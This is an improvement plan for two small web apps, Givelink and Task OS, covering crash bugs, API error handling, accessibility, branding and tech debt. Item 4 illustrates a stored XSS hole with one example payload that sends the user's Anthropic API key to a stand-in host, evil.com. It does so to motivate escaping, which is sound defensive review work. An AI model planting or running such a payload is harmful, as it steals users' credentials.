# Givelink + Task OS — Improvement Plan

Scanned: `index.html` (~7 600 lines), `givelink.html` (~1 750 lines), `sw.js` (83 lines).  
Total items: 20. Ordered by ROI within each tier.

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. App crashes on startup when localStorage data is corrupt

**What:** `load()` calls `JSON.parse()` with no try/catch — a single corrupt value kills the whole app.  
**Where:** `index.html:1125`, `givelink.html:443`  
```js
// index.html:1125 — no protection
function load(){const d=localStorage.getItem('taskos');if(d)S={...S,...JSON.parse(d)};}

// givelink.html:443 — same
function load(){const d=localStorage.getItem('givelink_sprint');if(d){const p=JSON.parse(d);S={...S,...p};}}
```
**Why it matters:** Private browsing, a failed mid-write, or a manually edited key leaves users locked out of the entire app with a blank screen and no recovery path.  
**Effort:** S  
**Suggested fix:**
- Wrap both `load()` bodies in `try { … } catch(e) { console.warn('State parse failed, resetting', e); }`
- On catch, call `save()` immediately with the default `S` to self-heal the key
- Show a one-time toast: "Restored default settings — your data may have been corrupted"

---

### 2. `callClaude()` swallows API errors — all AI features silently fail on 4xx/5xx

**What:** `res.json()` is called unconditionally; on a 401/429/500 the Anthropic error body is parsed as if it were a successful response, then `data.content?.[0]?.text` returns `null` with no user feedback.  
**Where:** `index.html:2213–2224`  
```js
const res = await fetch('https://api.anthropic.com/v1/messages', {...});
const data = await res.json(); // ← no res.ok guard
return data.content?.[0]?.text || null; // null returned silently
```
**Why it matters:** Wrong API key, rate limit, or model change causes every AI feature (Morning Briefing, Priority Audit, EOD Ritual, Outreach, Inbox Processor…) to fail silently. Users think the feature is broken.  
**Effort:** S  
**Suggested fix:**
- Add `if (!res.ok) { const err = await res.text(); throw new Error(\`API \${res.status}: \${err}\`); }` before `res.json()`
- Propagate the status code in the toast so "429 Rate Limited — try again in a minute" is shown
- Mirror the same fix in `givelink.html:1106` (already has `res.ok` check, but the caller at line 1108 does `data.content[0].text` without optional chaining — add `?.` there)

---

### 3. AI prompts hardcode `"Panos"` instead of using the `profileName` variable

**What:** The settings screen lets users set their name (stored as `taskos_name`), but every AI system prompt hard-wires `"Panos"` instead of using the `profileName` variable already in scope.  
**Where:** `index.html:4073`, `4133`, `4208`; also page `<title>` at line 12 and greeting at line 308  
```js
// index.html:4073
const prompt = `You are the personal chief-of-staff for Panos, founder of Givelink...`

// index.html:4133
const prompt = `Triage these inbox tasks for Panos, a startup founder (Givelink...)`
```
**Why it matters:** Any user who isn't Panos gets an AI assistant that addresses someone else by name, destroying trust in the product immediately.  
**Effort:** S  
**Suggested fix:**
- Replace all three hardcoded `"Panos"` occurrences in AI prompts with the `profileName` variable (already read from `localStorage` at line 1121)
- Replace `<title>Task OS — Panos</title>` (line 12) and the greeting `h1` (line 308) with dynamic values set after `load()`
- Add a first-run prompt if `taskos_name` is not set

---

### 4. Unescaped `t.title` in HTML templates — stored XSS can steal the Claude API key

**What:** Task titles are injected directly into `innerHTML` without `esc()` in over 10 templates, while other templates (e.g., the AI inbox processor at line 4164) correctly use `esc()`.  
**Where:** `index.html:1191, 1222, 1259, 1282, 1362, 1380, 1387, 1451, 1678, 1701`  
```js
// index.html:1222 — unescaped
<div class="tt">${t.title}</div>

// index.html:4164 — correctly escaped
<div ...>${esc(t.title)}</div>
```
**Why it matters:** A task title like `<img src=x onerror="fetch('https://evil.com?k='+localStorage.getItem('taskos_api_key'))">` executes on render, exfiltrating the user's Anthropic key. Self-XSS is still XSS — particularly relevant if data is ever imported or synced.  
**Effort:** S  
**Suggested fix:**
- Globally replace all `${t.title}` and `${task.title}` occurrences inside template literals that are assigned to `innerHTML` with `${esc(t.title)}`
- Add an ESLint or grep pre-commit rule: `innerHTML.*\$\{[^e]` to catch future regressions
- Also fix `${t.title.replace(/'/g,"\'")}` inline onclick patterns (line 4344) by using `data-id` attributes instead

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 5. No timeout on Claude API calls — UI hangs indefinitely

**What:** All `fetch()` calls to the Anthropic API have no `AbortController` or timeout. If the request stalls, the button stays disabled and the spinner never resolves.  
**Where:** `index.html:2217`, `givelink.html:1092`  
**Why it matters:** Mobile users on flaky connections will permanently lock interactive features. "AI broken" is the #1 perceived product quality signal.  
**Effort:** S  
**Suggested fix:**
- Add `const ctrl = new AbortController(); setTimeout(() => ctrl.abort(), 30_000);` before each fetch
- Pass `signal: ctrl.signal` in the fetch options
- Catch `AbortError` specifically and show "Request timed out — try again"

---

### 6. API key collected via `prompt()` dialog — looks like a phishing attack

**What:** When no Claude key is stored, both apps call `prompt('Enter your Anthropic API key:')` — a native browser dialog that looks identical to a malicious popup.  
**Where:** `givelink.html:1047`, `index.html` (Settings modal at line 750 is the right pattern, but the in-flow prompt fallback at givelink.html:1047 bypasses it)  
**Why it matters:** Users will dismiss the dialog thinking it is malware. The pattern also makes it impossible to paste a key on mobile. Zero recovery UX if dismissed.  
**Effort:** S  
**Suggested fix:**
- Remove both `prompt()` calls; instead redirect to or open the Settings modal
- In the Settings modal, add a link to the Anthropic console with instructions for new users
- Persist the key in `localStorage` with a clear label and offer a "forget key" button

---

### 7. 20+ modal close buttons and FAB have no ARIA label — WCAG 2.1 AA failure

**What:** Every `×` close button and the `+` FAB use only symbol text with no `aria-label`, making them invisible to screen readers.  
**Where:** `givelink.html:312, 368, 385, 401, 1709`; `index.html:341, 349, 583` and ~15 more modal headers throughout both files  
**Why it matters:** Screen reader users cannot close or open the primary action button — a WCAG 2.1 AA violation that blocks accessibility certification and excludes assistive technology users.  
**Effort:** S  
**Suggested fix:**
- Add `aria-label="Close"` to all `<button class="mc">×</button>` elements
- Add `aria-label="Add new task"` to the FAB
- Run a one-line grep to catch any remaining instances: `grep -n '">×<' *.html`

---

### 8. Off-brand status colors used across all health, sprint, and CRM views

**What:** Health scores, sprint velocity, CRM card age, and momentum indicators all use generic green `#22c55e`, amber `#fbbf24`, and red `#ef4444` — none of which are in the brand palette (purple `#6B3FA0`/`#5718CA`, pink `#C2185B`/`#E353B6`).  
**Where:** `givelink.html:522–523, 827, 1286, 1509–1510, 1544`; `index.html:2255`  
```js
// givelink.html:522
healthColor = pct>=60 ? '#22c55e' : pct>=30 ? '#fbbf24' : '#ef4444';
```
**Why it matters:** Breaks visual brand coherence across the two most-used views; the product looks like a generic template rather than a considered brand.  
**Effort:** M  
**Suggested fix:**
- Add CSS variables `--status-good`, `--status-warn`, `--status-bad` in the `:root` block using brand-adjacent hues (e.g., teal-purple for good, pink-amber for warn, deep-red for bad)
- Replace all hardcoded hex color decisions with these variables
- Review each context: "green = done" can stay semantic, but use `var(--status-good)` not a raw hex

---

### 9. Morning Briefing has no loading state — widget appears broken for ~2s on every load

**What:** `_fetchAIBriefing()` fires asynchronously in the background; the briefing panel renders empty until the AI response arrives, with no spinner or skeleton.  
**Where:** `index.html:4065–4095`  
```js
// index.html:4065 — cache miss path has no loading UI
try { const d=JSON.parse(cached); _renderAIBriefing(d,el); } catch(e) {}
// then async fetch begins with no feedback
```
**Why it matters:** Users see a blank card every morning and assume the feature is broken before the data loads. High-visibility slot, first thing seen on open.  
**Effort:** S  
**Suggested fix:**
- Set `el.innerHTML = '<div class="empty">⏳ Preparing your briefing…</div>'` synchronously before the fetch
- On error, show "Briefing unavailable — check your API key" with a retry button
- Consider caching yesterday's briefing as a stale-while-revalidate fallback

---

### 10. Service worker registration has no `.catch()` — offline support silently fails

**What:** Both apps register `./sw.js` with `.then()` only; if registration fails (CSP, HTTPS context, or file missing), the rejection is unhandled.  
**Where:** `givelink.html:1682`, `index.html:3929`  
**Why it matters:** Users lose offline capability and PWA install eligibility with no indication. In certain deployment configs (missing MIME type for sw.js) this fires on every page load.  
**Effort:** S  
**Suggested fix:**
- Add `.catch(err => console.warn('SW registration failed:', err))` to both calls
- Optionally: hide the "Install App" button if SW registration fails

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 11. `callClaude` and `callClaudeGL` are near-identical — every AI bug must be fixed twice

**What:** Both files independently implement the same Anthropic fetch wrapper with slightly different signatures. Any change (model update, header change, timeout) must be applied in two places.  
**Where:** `index.html:2213–2224`, `givelink.html:1218–1234`  
**Why it matters:** The AI model name `claude-haiku-4-5-20251001` is hardcoded in both — when this model is retired, both files will break independently.  
**Effort:** M  
**Suggested fix:**
- Extract a shared `claude-api.js` module with a single `callClaude(prompt, maxTokens, model)` function
- Import it via `<script src="./claude-api.js"></script>` in both HTML files
- Co-locate the model constant and API endpoint so they have a single source of truth

---

### 12. `sw.js` cache string is manually versioned — users may serve stale HTML after deploys

**What:** `const CACHE = 'task-os-20260419-190847'` is a hardcoded timestamp. If the app is deployed without updating this string, the service worker serves the old HTML and JS to returning users indefinitely.  
**Where:** `sw.js:1`  
**Why it matters:** Post-deploy, users see old bugs and missing features until they manually clear the cache. With a growing user base this becomes a support burden.  
**Effort:** S  
**Suggested fix:**
- Inject the cache key at build/deploy time using a script: `sed -i "s/task-os-.*/task-os-$(date +%Y%m%d-%H%M%S)';/" sw.js`
- Or add a `vercel.json` build hook that writes the timestamp; the `vercel.json` is already present in the repo
- As a minimum: document in a comment that this string must be updated on every deploy

---

### 13. Modal backdrop listeners re-added on every `renderView()` call — memory leak

**What:** `document.querySelectorAll('.mo').forEach(o => o.addEventListener('click', ...))` runs inside render functions, attaching duplicate listeners to elements that already have them.  
**Where:** `givelink.html:836`; similar pattern in `index.html:1607`  
**Why it matters:** After 50 view renders the modal overlay has 50 identical click handlers; on low-memory mobile devices this degrades performance and causes input lag.  
**Effort:** S  
**Suggested fix:**
- Use event delegation on `document.body` with a single listener: `document.body.addEventListener('click', e => { if (e.target.classList.contains('mo')) closeM(e.target.id); })`
- Remove all per-element `.addEventListener('click')` calls from inside render functions

---

### 14. Magic `setTimeout` delays create race conditions on slow devices

**What:** Several UI interactions depend on arbitrary millisecond delays instead of waiting for DOM readiness.  
**Where:** `index.html:1606` (`setTimeout(..., 50)` for focus), `index.html:4021` (`setTimeout(..., 900)` for UI reset); `givelink.html:1639–1654` (multiple `setTimeout(..., 3000)`)  
**Why it matters:** On a mid-range Android phone these timers routinely fire before the element is painted, causing focus failures, visible UI flickers, and confusing state resets.  
**Effort:** S  
**Suggested fix:**
- Replace focus delays with `requestAnimationFrame(() => el.focus())`
- Replace state-reset delays with Promise-chained callbacks or `transitionend` event listeners
- Add a comment on any remaining `setTimeout` explaining the minimum safe delay and why

---

### 15. No global `unhandledrejection` handler — async errors are invisible

**What:** Neither file registers `window.addEventListener('unhandledrejection', ...)`. Any unhandled rejected Promise (e.g., a failed fetch that's not awaited) produces nothing visible.  
**Where:** Not present in either file  
**Why it matters:** Silent failures make debugging in production impossible. Async bugs introduced during fast-moving feature development go undetected until users report them.  
**Effort:** S  
**Suggested fix:**
- Add at the top of each file's script block:
  ```js
  window.addEventListener('unhandledrejection', e => {
    console.error('Unhandled rejection:', e.reason);
  });
  ```
- In development, escalate to a toast so the developer sees it immediately

---

### 16. Inline `onclick` handlers with manual apostrophe escaping are fragile

**What:** Task titles containing `'` or `"` are manually escaped inside template literal onclick strings, but the escaping is incomplete and inconsistent.  
**Where:** `index.html:4344`, `index.html:1387`, `givelink.html:609`  
```js
// index.html:4344 — fragile
onclick="document.getElementById('eod-mit').value='${t.title.replace(/'/g,"\\'")}'"
```
**Why it matters:** A task title like `It's O'Brien's task` breaks the onclick entirely, preventing users from selecting their own tasks in the EOD Ritual and Weekly Review — two high-retention flows.  
**Effort:** M  
**Suggested fix:**
- Replace all inline onclick data-passing with `data-id` attributes and event delegation
- Look up the object from its id in the handler: `el.dataset.id → S.tasks.find(t => t.id === id)`
- This also eliminates the XSS surface from P0 item 4

---

### 17. `save()` and `load()` not wrapped in try/catch — crashes in private browsing

**What:** All `localStorage.setItem` and `localStorage.getItem` calls outside of `load()` (which is P0 item 1) also lack error handling. Private browsing mode throws `SecurityError` synchronously on any access.  
**Where:** `index.html:1124`, `givelink.html:443`; also `index.html:1436, 3872` and ~12 other direct `localStorage` calls  
**Why it matters:** Safari private browsing and some corporate browser policies block localStorage entirely. The app crashes immediately for these users with an uncaught JS exception.  
**Effort:** S  
**Suggested fix:**
- Wrap the `save()` function body in try/catch with a console.warn
- Create a `safeGet(key, fallback)` / `safeSet(key, val)` utility pair used everywhere instead of raw `localStorage` access

---

## 💡 P3 — Nice to have

### 18. AI model name is a hardcoded string literal — silent break on model retirement

**What:** `'claude-haiku-4-5-20251001'` appears as a raw string in `index.html:2219` and `givelink.html:1092, 1621`. When Anthropic retires this model ID, every AI call will fail with a 404 and no clear error message.  
**Where:** `index.html:2219`, `givelink.html:1092, 1621`  
**Why it matters:** Low probability but zero-warning failure — AI features stop working overnight with no code change.  
**Effort:** S  
**Suggested fix:**
- Define `const DEFAULT_MODEL = 'claude-haiku-4-5-20251001'` once at the top of each file (or in the shared module from P2 item 11)
- Reference the constant in all call sites so a model update is a one-line change

---

### 19. Clipboard fallback uses deprecated `document.execCommand('copy')`

**What:** When the Clipboard API is unavailable, the copy fallback uses `document.execCommand('copy')`, which is removed in some browsers and unreliable in others.  
**Where:** `givelink.html:1582`  
**Why it matters:** Copy-to-clipboard silently fails for users on Firefox with strict permissions or some WebViews.  
**Effort:** S  
**Suggested fix:**
- Remove the `execCommand` fallback; instead show the text in a `<pre>` with a "Select all" prompt so users can copy manually
- Or request the `clipboard-write` permission explicitly before attempting the write

---

### 20. Some empty states use generic text ("Empty") with no actionable CTA

**What:** A handful of empty list states show only "Empty" with no instruction for how to add content.  
**Where:** `index.html:1263` (`<div class="empty" style="padding:16px 0;">Empty</div>`); also lines 2308, 2312  
**Why it matters:** Users in a new session see empty panels with no guidance, increasing confusion and reducing feature discoverability.  
**Effort:** S  
**Suggested fix:**
- Replace "Empty" with context-specific messages: "No tasks in this bucket — drag one here or press **+ Add Task**"
- Ensure all three instances at lines 1263, 2308, 2312 have a matching CTA verb
